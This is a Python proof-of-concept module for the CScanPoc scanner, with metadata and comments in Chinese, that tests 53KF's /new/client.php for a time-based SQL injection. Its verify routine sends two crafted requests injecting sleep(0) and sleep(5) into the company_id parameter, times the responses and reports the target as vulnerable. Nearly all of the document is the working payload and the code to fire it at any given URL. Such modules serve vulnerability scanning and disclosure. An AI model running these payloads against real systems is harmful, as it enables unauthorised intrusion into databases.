# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = '53KF_0001'  # 平台漏洞编号，留空
    name = '53KF SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-05-19'  # 漏洞公布时间
    desc = '''
        53K /Fnew/client.php 存在延时注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0114927'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '53KF'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '94aa0873-e720-4fc7-b0fe-28c58d5f3b14'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0114927
            hh = hackhttp.hackhttp()
            arg = self.target
            # sleep(0)
            payload1 = arg + \
                '/new/client.php?m=Statistic&a=setLost&field=chat_robot_lost&type=plus&company_id[0]==-1%20or%201!=sleep(0)))limit%201%23between'
            # sleep(5)
            payload2 = arg + \
                '/new/client.php?m=Statistic&a=setLost&field=chat_robot_lost&type=plus&company_id[0]==-1%20or%201!=sleep(5)))limit%201%23between'
            t1 = time.time()
            code, head, res, err, _ = hh.http(payload1)
            if code != 200:
                return False
            t2 = time.time()
            code, head, res, err, _ = hh.http(payload2)
            if code != 200:
                return False
            t3 = time.time()
            if (t3+t1 - 2*t2) > 4:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\nSQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=payload2))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
